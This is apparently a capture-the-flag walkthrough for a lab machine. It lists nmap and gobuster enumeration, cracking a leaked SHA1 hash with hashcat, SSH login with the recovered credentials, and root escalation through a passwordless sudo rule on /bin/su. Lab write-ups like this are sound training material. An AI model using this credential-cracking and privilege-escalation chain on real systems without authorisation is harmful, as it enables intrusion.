---
tags: [Rooms]
title: 'CC: Pen Testing'
created: '2020-05-16T22:27:38.408Z'
modified: '2020-05-16T22:38:59.006Z'
---

# CC: Pen Testing

Nmap scan of the machine:

```
nmap -sV -sC -p- 10.10.91.184 -T4 -v
```

We discover that port 80 is open and has a default Apache web page.

Use gobuster to enumerate files/folders:

```
gobuster dir -u http://10.10.91.184 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 50 -e -l
```

We discover a `/secret` folder in the web application. Using the browser we see a blank page when accessing it.

Use gobuster to enumerate further files/folders on this `/secret` folder:

```
gobuster dir -u http://10.10.91.184/secret/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 50 -e -l -x txt
```

We discover a `secret.txt` file inside the folder. This file contains a username and a SHA1 hash.

`nyan:046385855FC9580393853D8E81F240B66FE9A7B8`

Using hashcat we can crack the hash:

```
hashcat -m 100 -a 3 hash.txt /usr/share/wordlists/rockyou.txt --force
```

The resulting password is `nyan`.

According to the nmap scan we performed before, port 22 is open.
We can use SSH with the credentials we found to access the target machine:

```
ssh nyan@10.10.91.184
```

We have a shell with the user nyan.
Inside the users' home directory, we can find the **user.txt**

We look at what sudo permissions does to user have:

```
sudo -l
```

The user nyan has permission to execute /bin/su as root without being asked for a password.

```
User nyan may run the following commands on ubuntu:
    (root) NOPASSWD: /bin/su
```

We proceed to execute the following command to obtain escalate our privileges:

```
sudo /bin/su
```

The **root.txt** file is in /root/root.txt
